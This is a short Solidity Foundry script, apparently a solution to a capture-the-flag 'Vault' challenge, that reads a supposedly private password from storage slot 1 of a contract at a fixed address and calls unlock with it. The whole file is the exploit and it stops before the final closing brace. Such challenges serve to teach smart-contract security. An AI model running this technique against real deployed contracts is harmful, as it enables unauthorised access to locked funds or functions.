//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract AttackVault is Script{

    function run() external {
        address instance = 0x040d1d7DA51A6C07Dc9dd6D122AC26a78d17dc6D;
        

        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        console.log("The password is: ");
        console.logBytes32(password);

        vm.startBroadcast();
        Vault(instance).unlock(password);
        vm.stopBroadcast();
        
    }
